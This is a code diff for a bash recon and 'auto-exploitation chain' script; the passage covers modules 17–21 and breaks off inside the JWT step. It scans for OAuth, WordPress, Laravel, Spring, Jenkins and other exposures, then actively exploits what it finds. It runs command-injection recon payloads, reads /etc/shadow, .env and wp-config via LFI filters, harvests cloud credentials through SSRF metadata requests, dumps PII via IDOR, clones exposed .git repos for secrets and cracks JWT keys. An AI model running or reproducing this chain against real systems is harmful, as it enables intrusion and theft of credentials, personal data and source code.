+                    uniq_add "$O/oauth_redirect_uri.txt" "OAUTH_REDIRECT_URI_OPEN [→ ${loc}]: $test_url"
+                    log_hit "OAuth redirect_uri open redirect: $test_url → $loc"
+                fi
+            done
+        fi
+
+        # 2) missing state param on authorize
+        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
+            if ! echo "$url" | grep -qiE "state="; then
+                uniq_add "$O/oauth_no_state.txt" "OAUTH_NO_STATE (login-CSRF risk): $url"
+            fi
+        fi
+
+        # 3) implicit-flow token leak check (fragment vs query)
+        if echo "$url" | grep -qE "(response_type=token|response_type%3dtoken)"; then
+            uniq_add "$O/oauth_implicit.txt" "OAUTH_IMPLICIT_FLOW (token in fragment — leak via Referer/history): $url"
+        fi
+
+        # 4) client_secret / client_id exposure in JS
+        local js_all; js_all=$(cat "$WORKSPACE/js/"*.txt 2>/dev/null | head -c 2000000)
+        echo "$js_all" | grep -oE '"(client_secret|clientSecret|client_secret_id|secret_key|api_secret)"\s*[:=]\s*"[^"]{8,}"' \
+            | sort -u > "$O/oauth_secrets_in_js.txt" || true
+    done < "$OAUTH_CAND"
+
+    # post-processing: dedupe secrets from JS
+    grep -hoE '"(client_secret|clientSecret|client_secret_id|secret_key|api_secret|consumer_secret)"\s*[:=]\s*"[^"]{8,}"' \
+        "$WORKSPACE/js/"*.txt 2>/dev/null | sort -u >> "$O/oauth_secrets_in_js.txt" 2>/dev/null || true
+    sort -u -o "$O/oauth_secrets_in_js.txt" "$O/oauth_secrets_in_js.txt" 2>/dev/null || true
+    [[ -s "$O/oauth_secrets_in_js.txt" ]] && log_hit "OAuth secrets leaked in JS: $(cnt "$O/oauth_secrets_in_js.txt")"
+    [[ -s "$O/oauth_redirect_uri.txt" ]] && log_hit "OAuth redirect_uri open: $(cnt "$O/oauth_redirect_uri.txt")"
+    log_ok "OAuth scan complete"
+}
+# ══════════════════════════════════════════════════════
+# MODULE 18 — TECHNOLOGY-SPECIFIC CHECKS
+# ══════════════════════════════════════════════════════
+mod_tech() {
+    progress "MODULE 18 — Technology-Specific Checks"
+    log_section "MODULE 18 — TECHNOLOGY-SPECIFIC VULNERABILITY CHECKS"
+    local O="$WORKSPACE/vulns/tech"
+    mkdir -p "$O" 2>/dev/null || true
+    local TECHS="$WORKSPACE/subdomains/tech_stack.txt"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+    [[ ! -s "$TECHS" ]] && { log_warn "No tech stack data — running quick httpx re-fingerprint"; ensure_live; }
+
+    # Which technologies are present?
+    local techs_lc; techs_lc=$(tr '[:upper:]' '[:lower:]' < "$TECHS" 2>/dev/null)
+
+    # ── WordPress ─────────────────────────────────────
+    if echo "$techs_lc" | grep -q "wordpress"; then
+        log_info "WordPress detected — probing xmlrpc + user enumeration + wp-json"
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            local xmlrpc_code; xmlrpc_code=$(_curl -X POST -H "Content-Type: text/xml" \
+                -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
+                -o /dev/null -w "%{http_code}" "$host/xmlrpc.php" 2>/dev/null || echo 000)
+            [[ "$xmlrpc_code" == "200" ]] && \
+                uniq_add "$O/wordpress.txt" "WORDPRESS_XMLRPC_ENABLED (brute-force/amplification): $host/xmlrpc.php" && \
+                log_hit "WordPress xmlrpc.php enabled: $host/xmlrpc.php"
+
+            local users; users=$(_curl "$host/wp-json/wp/v2/users" 2>/dev/null | head -c 2000 || true)
+            echo "$users" | grep -qE '"slug"|"name"' && \
+                uniq_add "$O/wordpress.txt" "WORDPRESS_USER_ENUM: $host/wp-json/wp/v2/users" && \
+                log_hit "WordPress user enumeration: $host/wp-json/wp/v2/users"
+
+            local upd; upd=$(_curl -o /dev/null -w "%{http_code}" "$host/wp-json/wp/v2/users?role=administrator" 2>/dev/null || echo 000)
+            [[ "$upd" == "200" ]] && \
+                uniq_add "$O/wordpress.txt" "WORDPRESS_ADMIN_ENUM: $host/wp-json/wp/v2/users?role=administrator"
+        done
+    fi
+
+    # ── Laravel ───────────────────────────────────────
+    if echo "$techs_lc" | grep -q "laravel"; then
+        log_info "Laravel detected — checking APP_DEBUG / .env exposure"
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            local dbg; dbg=$(_curl "$host/_ignition/execute-solution" 2>/dev/null | head -c 500 || true)
+            echo "$dbg" | grep -qiE "(ignition|laravel|exception)" && \
+                uniq_add "$O/laravel.txt" "LARAVEL_IGNITION_ENABLED (CVE-2021-3129 RCE): $host/_ignition/execute-solution" && \
+                log_hit "Laravel Ignition exposed: $host/_ignition/execute-solution"
+            local env_body; env_body=$(_curl "$host/.env" 2>/dev/null | head -c 1500 || true)
+            echo "$env_body" | grep -qiE "APP_KEY|DB_PASSWORD|APP_ENV" && \
+                uniq_add "$O/laravel.txt" "LARAVEL_ENV_EXPOSED: $host/.env" && \
+                log_hit "Laravel .env exposed: $host/.env"
+        done
+    fi
+
+    # ── Django ────────────────────────────────────────
+    if echo "$techs_lc" | grep -q "django"; then
+        log_info "Django detected — admin panel + debug mode"
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            local adm; adm=$(_curl -o /dev/null -w "%{http_code}" "$host/admin/" 2>/dev/null || echo 000)
+            [[ "$adm" == "200" ]] && \
+                uniq_add "$O/django.txt" "DJANGO_ADMIN_EXPOSED (login page reachable): $host/admin/" && \
+                log_hit "Django admin exposed: $host/admin/"
+            local dbg; dbg=$(_curl "$host/__debug__/" 2>/dev/null | head -c 300 || true)
+            echo "$dbg" | grep -qi "django" && \
+                uniq_add "$O/django.txt" "DJANGO_DEBUG_TOOLBAR: $host/__debug__/"
+        done
+    fi
+
+    # ── Spring / Java ─────────────────────────────────
+    if echo "$techs_lc" | grep -qiE "spring|java|tomcat|jetty"; then
+        log_info "Java stack detected — Spring Boot actuator probes"
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            for p in /actuator /actuator/health /actuator/env /actuator/heapdump \
+                     /actuator/mappings /actuator/beans /actuator/configprops; do
+                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
+                [[ "$c" == "200" ]] && \
+                    uniq_add "$O/spring.txt" "SPRING_ACTUATOR [${p}]: $host$p" && \
+                    log_hit "Spring actuator exposed: $host$p"
+            done
+            # Tomcat manager
+            for p in /manager/html /manager/status /host-manager/html; do
+                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
+                [[ "$c" =~ ^(200|302|401)$ ]] && \
+                    uniq_add "$O/spring.txt" "TOMCAT_MANAGER [${p}] [${c}]: $host$p"
+            done
+        done
+    fi
+
+    # ── Jenkins / CI ──────────────────────────────────
+    if echo "$techs_lc" | grep -qiE "jenkins|gitlab|hudson"; then
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            for p in /jenkins /ci /gitlab /-/user; do
+                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
+                [[ "$c" == "200" ]] && \
+                    uniq_add "$O/ci_cd.txt" "CI_PANEL [${p}]: $host$p" && \
+                    log_hit "CI/CD panel: $host$p"
+            done
+            # Jenkins unauthenticated script console
+            local scr; scr=$(_curl -o /dev/null -w "%{http_code}" "$host/jenkins/script" 2>/dev/null || echo 000)
+            [[ "$scr" == "200" ]] && \
+                uniq_add "$O/ci_cd.txt" "JENKINS_SCRIPT_CONSOLE (unauth RCE): $host/jenkins/script" && \
+                log_hit "Jenkins script console unauth: $host/jenkins/script"
+        done
+    fi
+
+    # ── Monitoring stacks ─────────────────────────────
+    if echo "$techs_lc" | grep -qiE "grafana|kibana|prometheus"; then
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            for p in /grafana/login /grafana/api/health /app/kibana /_cat/indices /metrics; do
+                local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
+                [[ "$c" == "200" ]] && \
+                    uniq_add "$O/monitoring.txt" "MONITORING [${p}]: $host$p"
+            done
+            local gf; gf=$(_curl "$host/grafana/api/dashboards/home" 2>/dev/null | head -c 300 || true)
+            echo "$gf" | grep -qiE "dashboard|title" && \
+                uniq_add "$O/monitoring.txt" "GRAFANA_ANONYMOUS (CVE-2021-43798 LFI): $host/grafana"
+        done
+    fi
+
+    # ── phpMyAdmin / DB panels ────────────────────────
+    for host in $(head -5 "$LIVE" 2>/dev/null); do
+        for p in /phpmyadmin /pma /myadmin /adminer.php /dbadmin; do
+            local c; c=$(_curl -o /dev/null -w "%{http_code}" "$host$p" 2>/dev/null || echo 000)
+            [[ "$c" =~ ^(200|302)$ ]] && \
+                uniq_add "$O/db_panels.txt" "DB_PANEL [${p}] [${c}]: $host$p" && \
+                log_hit "Database panel exposed: $host$p"
+        done
+    done
+
+    # ── Rails ─────────────────────────────────────────
+    if echo "$techs_lc" | grep -qiE "rails|ruby"; then
+        for host in $(head -5 "$LIVE" 2>/dev/null); do
+            local rp; rp=$(_curl -o /dev/null -w "%{http_code}" "$host/rails/info/routes" 2>/dev/null || echo 000)
+            [[ "$rp" == "200" ]] && \
+                uniq_add "$O/rails.txt" "RAILS_ROUTES_LEAK: $host/rails/info/routes" && \
+                log_hit "Rails route info leaked: $host/rails/info/routes"
+            local assets; assets=$(_curl -o /dev/null -w "%{http_code}" "$host/assets/application-" 2>/dev/null || echo 000)
+            [[ "$assets" == "200" ]] && \
+                uniq_add "$O/rails.txt" "RAILS_DEV_SECRETS (development env): $host/assets/"
+        done
+    fi
+
+    for f in wordpress laravel django spring ci_cd monitoring db_panels rails; do
+        sort -u -o "$O/${f}.txt" "$O/${f}.txt" 2>/dev/null || true
+    done
+    local total_tech; total_tech=$(cat "$O"/*.txt 2>/dev/null | wc -l)
+    log_ok "Tech-specific findings: $total_tech → $O/"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 19 — SCREENSHOTS
+# ══════════════════════════════════════════════════════
+mod_screenshots() {
+    [[ "$F_QUICK" == true ]] && return
+    progress "MODULE 19 — Screenshots"
+    log_section "MODULE 19 — SCREENSHOTS (gowitness)"
+    local O="$WORKSPACE/screenshots"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+
+    [[ ! -s "$LIVE" ]] && { log_warn "No live hosts for screenshots"; return; }
+    if ! has gowitness; then
+        log_warn "gowitness not installed — skipping screenshots"
+        return
+    fi
+
+    log_info "Screenshotting $(cnt "$LIVE") live hosts..."
+    if gowitness --help 2>&1 | grep -q -- "--screenshot-path"; then
+        timeout 600 gowitness file -f "$LIVE" \
+            --screenshot-path "$O" \
+            --threads 10 --timeout 15 2>/dev/null || true
+    else
+        timeout 600 gowitness file -f "$LIVE" \
+            -P "$O" \
+            -t 10 --timeout 15 2>/dev/null || true
+    fi
+    local shots; shots=$(find "$O" -name "*.png" 2>/dev/null | wc -l)
+    log_ok "Screenshots taken: $shots → $O/"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 20 — URL CLASSIFIER (IDOR/BAC/upload/export/etc)
+# ══════════════════════════════════════════════════════
+mod_classify() {
+    progress "MODULE 20 — URL Classification"
+    log_section "MODULE 20 — URL CLASSIFIER (TARGETED ENDPOINT MAPPING)"
+    local C="$WORKSPACE/classified"
+    local EP="$WORKSPACE/endpoints/all_endpoints.txt"
+    local ALL="$WORKSPACE/urls/all_urls.txt"
+    mkdir -p "$C"/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports} 2>/dev/null || true
+
+    # ── IDOR-ish endpoints (object access patterns) ──
+    grep -iE '(/api/v[0-9]*/)?(users?|accounts?|orders?|invoices?|payments?|transactions?|profiles?|members?|clients?|customers?|products?|posts?|comments?|messages?|conversations?|files?|documents?|downloads?|tickets?|subscriptions?)(/|$)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/idor/idor_endpoints.txt" || true
+    grep -iE '[?&](id|uid|user_id|account_id|order_id|file_id|doc_id|invoice_id|user|account|file|doc|token|ref)=[^&]+' \
+        "$ALL" 2>/dev/null | sort -u > "$C/idor/idor_param_urls.txt" || true
+
+    # ── BAC candidates (admin/panel/internal) ─────────
+    grep -iE '(admin|dashboard|panel|console|manage|manager|internal|staff|employee|operator|backoffice|control|superuser|root)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/bac/bac_candidates.txt" || true
+
+    # ── OAuth / SSO ───────────────────────────────────
+    grep -iE '(oauth|oidc|sso|saml|authorize|connect/|token|logout|login/|signin|callback|redirect_uri)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/oauth/oauth_urls.txt" || true
+
+    # ── Upload endpoints ──────────────────────────────
+    grep -iE '(upload|uploader|media|attach|avatar|image-upload|file-upload|dropzone|multipart)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/upload/upload_urls.txt" || true
+
+    # ── Export / download ─────────────────────────────
+    grep -iE '(export|download|print|report|generate|dump|csv|excel|pdf\?|xlsx)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/export/export_urls.txt" || true
+
+    # ── Payment ───────────────────────────────────────
+    grep -iE '(checkout|payment|stripe|paypal|braintree|charge|invoice|billing|purchase|order|refund|subscription|price|amount)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/payment/payment_urls.txt" || true
+
+    # ── Webhooks ──────────────────────────────────────
+    grep -iE '(webhook|hook|callback|notify|events?/|pusher|socket)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/webhook/webhook_urls.txt" || true
+
+    # ── Admin flows ───────────────────────────────────
+    grep -iE '(login|signin|sign-in|log-in|auth|authenticate|session|password|forgot|reset|2fa|mfa|otp|verify)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/admin/auth_urls.txt" || true
+
+    # ── Debug / info leaks ────────────────────────────
+    grep -iE '(debug|test|dev|staging|beta|internal|trace|health|status|info|metrics|env|config|swagger|graphql|actuator|\.git|\.env|phpinfo|server-status)' \
+        "$ALL" "$EP" 2>/dev/null | sort -u > "$C/debug/debug_urls.txt" || true
+
+    # ── Burp import bundle (scope-aware request lines) ─
+    grep -E '^https?://' "$ALL" 2>/dev/null | head -2000 | while IFS= read -r u; do
+        echo "GET $u HTTP/1.1" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
+        echo "Host: $(echo "$u" | grep -oP 'https?://\K[^/]+')" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
+        echo "" >> "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
+    done
+    sort -u -o "$C/burp_imports/burp_requests.txt" "$C/burp_imports/burp_requests.txt" 2>/dev/null || true
+
+    # ── BAC auto-probe: unauthenticated admin access ──
+    log_info "BAC auto-probe: unauthenticated access to admin/panel endpoints..."
+    local bac_found=0
+    while IFS= read -r url; do
+        local c body
+        c=$(_curl -o /dev/null -w "%{http_code}" --max-time 8 "$url" 2>/dev/null || echo 000)
+        [[ "$c" =~ ^(200|201)$ ]] || continue
+        body=$(_curl --max-time 8 "$url" 2>/dev/null | head -c 3000 || true)
+        # Not a login page / not a redirect to login
+        if ! echo "$body" | grep -qiE "(login|sign in|unauthorized|forbidden|access denied|401)" && \
+           echo "$body" | grep -qiE "(dashboard|admin|panel|user[s]? list|statistics|server|config|setting|user management|role|permission)"; then
+            uniq_add "$C/bac/bac_confirmed.txt" "BAC_UNAUTH [${c}]: $url"
+            log_hit "BAC — admin content unauthenticated: $url"
+            ((bac_found++))
+        fi
+    done < <(head -80 "$C/bac/bac_candidates.txt" 2>/dev/null)
+    [[ "$bac_found" -gt 0 ]] && log_hit "BAC CONFIRMED: $bac_found endpoints accessible without auth"
+
+    for d in idor bac oauth upload export payment webhook admin debug; do
+        for f in "$C/$d"/*.txt; do
+            [[ -f "$f" ]] && sort -u -o "$f" "$f" 2>/dev/null || true
+        done
+    done
+
+    local total_c; total_c=$(find "$C" -name "*.txt" -type f 2>/dev/null | xargs wc -l 2>/dev/null | tail -1 | awk '{print $1}')
+    log_ok "Classifier complete: $total_c classified URLs → $C/"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 21 — AUTO-EXPLOITATION CHAIN 💀
+# ══════════════════════════════════════════════════════
+mod_exploit_chain() {
+    progress "MODULE 21 — AUTO-EXPLOITATION CHAIN"
+    log_section "MODULE 21 — AUTO-EXPLOITATION CHAIN 💀"
+    local O="$WORKSPACE/vulns/exploit"
+    mkdir -p "$O" 2>/dev/null || true
+
+    # ── 0. Import every confirmed finding from prior modules ──
+    local CHAIN_IN="$O/chain_input.txt"
+    : > "$CHAIN_IN"
+    for f in \
+        "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt" \
+        "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" \
+        "$WORKSPACE/vulns/lfi/lfi_rce.txt" \
+        "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt" \
+        "$WORKSPACE/vulns/ssrf/ssrf_divergence.txt" \
+        "$WORKSPACE/vulns/ssrf/ssrf_timebased.txt" \
+        "$WORKSPACE/vulns/sqli/sqli_findings.txt" \
+        "$WORKSPACE/vulns/idor/idor_seq_diff.txt" \
+        "$WORKSPACE/vulns/idor/idor_confirmed.txt" \
+        "$WORKSPACE/vulns/xss/dalfox_results.txt" \
+        "$WORKSPACE/vulns/cors/cors_confirmed.txt" \
+        "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt" \
+        "$WORKSPACE/vulns/oauth/oauth_secrets_in_js.txt" \
+        "$WORKSPACE/vulns/misconfig/sensitive_files.txt" \
+        "$WORKSPACE/classified/bac/bac_confirmed.txt" \
+        "$WORKSPACE/subdomains/takeover_candidates.txt" \
+        "$WORKSPACE/vulns/nuclei/nuclei_takeover.txt" \
+        "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" \
+        "$WORKSPACE/vulns/tech/wordpress.txt" \
+        "$WORKSPACE/vulns/tech/spring.txt" \
+        "$WORKSPACE/vulns/tech/ci_cd.txt" \
+        2>/dev/null; do
+        [[ -s "$f" ]] && cat "$f" >> "$CHAIN_IN"
+    done
+    sort -u -o "$CHAIN_IN" "$CHAIN_IN"
+    local chain_total; chain_total=$(cnt "$CHAIN_IN")
+    log_ok "Chain input: $chain_total unique confirmed findings"
+
+    # ── 1. CMDi → full host recon + interactive marker ──
+    if [[ -s "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt" ]]; then
+        log_hit "EXPLOIT[CMDi]: executing full host recon on confirmed targets"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' | head -1)
+            [[ -z "$target" || -z "$payload" ]] && continue
+            local cmd="${payload}id;whoami;uname -a;cat /etc/hostname;ifconfig 2>/dev/null|head -3"
+            local out; out=$(_curl --max-time 10 "$(echo "$target" | qsreplace "$cmd" 2>/dev/null || true)" 2>/dev/null | head -c 2000 || true)
+            if [[ -n "$out" ]]; then
+                uniq_add "$O/cmdi_recon.txt" "### $target"
+                echo "$out" | grep -E "uid=|Linux|hostname|inet " | while IFS= read -r l; do
+                    uniq_add "$O/cmdi_recon.txt" "$l"
+                done
+                uniq_add "$O/chain_confirmed.txt" "RCE[CMDi]: $target"
+                log_hit "RCE via CMDi: $target"
+            fi
+        done < "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"
+    fi
+
+    # ── 2. LFI → base64 decode verification + deep reads ──
+    if [[ -s "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" ]]; then
+        log_hit "EXPLOIT[LFI]: verifying + decoding confirmed file reads"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            [[ -z "$target" ]] && continue
+            local dec; dec=$(echo "$line" | grep -q "LFI_B64" && echo yes || echo no)
+            if [[ "$dec" == "yes" ]]; then
+                local b64out; b64out=$(_curl --max-time 8 "$target" 2>/dev/null | tr -d '\n' | base64 -d 2>/dev/null | head -c 1000 || true)
+                [[ -n "$b64out" ]] && { uniq_add "$O/lfi_decoded.txt" "### $target"; echo "$b64out" | while IFS= read -r l; do uniq_add "$O/lfi_decoded.txt" "$l"; done; }
+            fi
+            # try /etc/shadow + wp-config + env via filter chain
+            for deep in \
+                "php://filter/convert.base64-encode/resource=/etc/shadow" \
+                "php://filter/convert.base64-encode/resource=/proc/1/environ" \
+                "php://filter/convert.base64-encode/resource=../wp-config.php" \
+                "php://filter/convert.base64-encode/resource=../.env"; do
+                local fuzz; fuzz=$(echo "$target" | qsreplace "$deep" 2>/dev/null || true)
+                local db; db=$(_curl --max-time 8 "$fuzz" 2>/dev/null | tr -d '\n' | base64 -d 2>/dev/null | head -c 800 || true)
+                if echo "$db" | grep -qiE "(root:|APP_KEY|DB_PASSWORD|SECRET|FLAG|aws|BEGIN RSA|private key)"; then
+                    uniq_add "$O/lfi_deep.txt" "### $fuzz"
+                    echo "$db" | while IFS= read -r l; do uniq_add "$O/lfi_deep.txt" "$l"; done
+                    uniq_add "$O/chain_confirmed.txt" "FILE_READ[LFI]: $fuzz"
+                    log_hit "LFI deep read (creds/config): $fuzz"
+                fi
+            done
+        done < "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"
+    fi
+
+    # ── 3. SQLi → DB fingerprint + banner ──
+    if [[ -d "$WORKSPACE/vulns/sqli/sqlmap_active" ]]; then
+        log_hit "EXPLOIT[SQLi]: extracting DB fingerprints from sqlmap output"
+        find "$WORKSPACE/vulns/sqli/sqlmap_active" -name "log" -type f 2>/dev/null | while IFS= read -r f; do
+            local banner; banner=$(grep -iE "(banner|dbms:|back-end DBMS)" "$f" 2>/dev/null | head -3 || true)
+            [[ -n "$banner" ]] && { uniq_add "$O/sqli_fingerprint.txt" "### $(basename "$(dirname "$f")")"; echo "$banner" | while IFS= read -r l; do uniq_add "$O/sqli_fingerprint.txt" "$l"; done; }
+        done
+        [[ -s "$O/sqli_fingerprint.txt" ]] && uniq_add "$O/chain_confirmed.txt" "SQLI[DB-FINGERPRINT]: $(cnt "$O/sqli_fingerprint.txt") lines"
+    fi
+
+    # ── 4. IDOR → verify + auto-dump object graph ──
+    if [[ -s "$WORKSPACE/vulns/idor/idor_seq_diff.txt" ]]; then
+        log_hit "EXPLOIT[IDOR]: verifying candidates + dumping objects"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            [[ -z "$target" ]] && continue
+            local body; body=$(_curl --max-time 8 "$target" 2>/dev/null | head -c 4000 || true)
+            if [[ -n "$body" ]] && echo "$body" | grep -qiE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing|account|balance|order|invoice|token)"'; then
+                uniq_add "$O/idor_verified.txt" "### $target"
+                echo "$body" | jq -c . 2>/dev/null | head -1 | while IFS= read -r l; do uniq_add "$O/idor_verified.txt" "$l"; done
+                uniq_add "$O/chain_confirmed.txt" "IDOR[PII-DUMP]: $target"
+                log_hit "IDOR verified + PII dumped: $target"
+            fi
+        done < "$WORKSPACE/vulns/idor/idor_seq_diff.txt"
+    fi
+
+    # ── 5. Subdomain takeover → CNAME + fingerprint verify ──
+    if [[ -s "$WORKSPACE/subdomains/takeover_candidates.txt" ]]; then
+        log_hit "EXPLOIT[TAKEOVER]: verifying dangling CNAMEs"
+        while IFS= read -r line; do
+            local sub; sub=$(echo "$line" | awk '{print $1}')
+            [[ -z "$sub" ]] && continue
+            local cname; cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
+            if [[ -n "$cname" ]]; then
+                local resp; resp=$(_curl --max-time 8 "http://$sub" 2>/dev/null | head -c 1500 || true)
+                local fp=""
+                echo "$cname" | grep -qi "github"      && fp="No such repository"
+                echo "$cname" | grep -qi "herokuapp"   && fp="There's nothing here, yet"
+                echo "$cname" | grep -qi "cloudfront"  && fp="ERROR: The request could not be satisfied"
+                echo "$cname" | grep -qi "azurewebsites" && fp="404 Web Site not found"
+                echo "$cname" | grep -qi "netlify"     && fp="Not Found - Request ID"
+                echo "$cname" | grep -qi "fastly"      && fp="Fastly error: unknown domain"
+                echo "$cname" | grep -qi "s3"          && fp="NoSuchBucket"
+                echo "$cname" | grep -qi "pantheon"    && fp="404 error unknown site"
+                if [[ -n "$fp" ]] && echo "$resp" | grep -qiE "$(echo "$fp" | sed 's/ /.*/g')"; then
+                    uniq_add "$O/takeover_verified.txt" "TAKEOVER_VERIFIED [${cname}]: $sub"
+                    uniq_add "$O/chain_confirmed.txt" "SUBDOMAIN_TAKEOVER: $sub"
+                    log_hit "SUBDOMAIN TAKEOVER verified: $sub → $cname"
+                else
+                    uniq_add "$O/takeover_dangling.txt" "DANGLING_CNAME [no fingerprint]: $sub → $cname"
+                fi
+            fi
+        done < <(head -30 "$WORKSPACE/subdomains/takeover_candidates.txt" 2>/dev/null)
+    fi
+
+    # ── 6. .git exposure → full clone via git-dumper ──
+    if [[ -s "$WORKSPACE/vulns/misconfig/sensitive_files.txt" ]]; then
+        grep -i "\.git" "$WORKSPACE/vulns/misconfig/sensitive_files.txt" 2>/dev/null | while IFS= read -r line; do
+            local base; base=$(echo "$line" | grep -oP 'https?://\S+' | head -1 | sed 's|/\.git/.*||;s|/\.git$||')
+            [[ -z "$base" ]] && continue
+            if has git-dumper; then
+                log_hit "EXPLOIT[GIT]: cloning exposed repo $base/.git"
+                local outdir; outdir="$O/git_$(safe_name "$base")"
+                timeout 120 git-dumper "$base/.git" "$outdir" 2>/dev/null || true
+                if [[ -d "$outdir" ]]; then
+                    local files; files=$(find "$outdir" -type f ! -path "*/.git/*" 2>/dev/null | wc -l)
+                    [[ "$files" -gt 0 ]] && {
+                        uniq_add "$O/git_cloned.txt" "GIT_CLONED [${files} files]: $base/.git"
+                        uniq_add "$O/chain_confirmed.txt" "SOURCE_DISCLOSURE[GIT]: $base/.git"
+                        log_hit ".git fully cloned: $base/.git ($files files)"
+                        grep -rhiE "(api[_-]?key|secret|password|token|BEGIN (RSA|OPENSSH|EC) PRIVATE)" "$outdir" \
+                            --include="*.php" --include="*.py" --include="*.js" --include="*.env" \
+                            --include="*.json" --include="*.yml" --include="*.yaml" --include="*.conf" 2>/dev/null \
+                            | grep -viE "(example|test_|your_|xxxx|password_field|password_confirmation)" \
+                            | sort -u | head -50 > "$O/git_secrets.txt"
+                        [[ -s "$O/git_secrets.txt" ]] && log_hit "Secrets in cloned repo: $(cnt "$O/git_secrets.txt")"
+                    }
+                fi
+            else
+                log_warn "git-dumper not installed — manual: git-dumper $base/.git $O/git_manual"
+            fi
+        done
+    fi
+
+    # ── 7. SSRF → OOB re-fire + metadata sweep ──
+    if [[ -s "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt" ]] && [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
+        log_hit "EXPLOIT[SSRF]: re-firing OOB + metadata sweep on confirmed"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            [[ -z "$target" ]] && continue
+            local rand; rand="srv$(head -c 6 /dev/urandom | xxd -p)"
+            local oob="http://${rand}.${INTERACTSH_DOMAIN}/"
+            _curl --max-time 6 "$(echo "$target" | qsreplace "$oob" 2>/dev/null || true)" >/dev/null 2>&1 || true
+            uniq_add "$O/ssrf_oob_fired.txt" "OOB_FIRED [${rand}.${INTERACTSH_DOMAIN}]: $target"
+            # metadata via every confirmed entry
+            for region in "169.254.169.254/latest/meta-data/iam/security-credentials/" \
+                          "169.254.169.254/latest/user-data/" \
+                          "metadata.google.internal/computeMetadata/v1/?recursive=true"; do
+                local murl; murl=$(echo "$target" | qsreplace "http://${region}" 2>/dev/null || true)
+                local mb; mb=$(_curl --max-time 8 -H "Metadata-Flavor: Google" "$murl" 2>/dev/null | head -c 3000 || true)
+                if echo "$mb" | grep -qiE "(AccessKeyId|SecretAccessKey|Token|accountId|project|serviceAccount)"; then
+                    uniq_add "$O/cloud_creds.txt" "### $target"
+                    echo "$mb" | while IFS= read -r l; do uniq_add "$O/cloud_creds.txt" "$l"; done
+                    uniq_add "$O/chain_confirmed.txt" "CLOUD_CREDENTIALS[SSRF]: $target"
+                    log_hit "CLOUD CREDENTIALS via SSRF: $target"
+                fi
+            done
+        done < "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"
+    fi
+
+    # ── 8. JWT → alg:none + weak-secret crack ──
+    local JWT_FILE="$WORKSPACE/js/jwt_tokens.txt"
+    if [[ -s "$JWT_FILE" ]] && [[ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]]; then
+        log_hit "EXPLOIT[JWT]: cracking weak secrets + alg:none test"
+        local jwt_wl="$O/weak_jwt_secrets.txt"
+        cat > "$jwt_wl" << 'JWTWL'
+secret
+Secret
+SECRET
+password
+123456
+admin
+administrator
+changeme
+letmein
+qwerty
+key
+Key
+secretkey
+secret_key
+mysecret
+jwt
+JWT
+token
+Token
+tokens
+supersecret
+private
+public
+login
+password123
+pass
+test
+testing
+default
+jwt_secret
+auth
+authentication
+12345678
+123456789
+abcdef
+access
+Access
+AccessToken
+JWT_SECRET
+development
+prod
+production
+JWTWL
+        local n=0
+        while IFS= read -r token && [[ $n -lt 30 ]]; do
+            n=$((n+1))
+            local cracked; cracked=$(python3 "$HOME/tools/jwt_tool/jwt_tool.py" -C "$jwt_wl" "$token" 2>/dev/null \
+                | grep -oE "It worked!.*" | head -1 || true)
+            if [[ -n "$cracked" ]]; then
+                uniq_add "$O/jwt_cracked.txt" "JWT_WEAK_SECRET [${cracked}]: $token"
+                uniq_add "$O/chain_confirmed.txt" "JWT_FORGE[WEAK_SECRET]: $token"
+                log_hit "JWT weak secret: $cracked"
+            fi
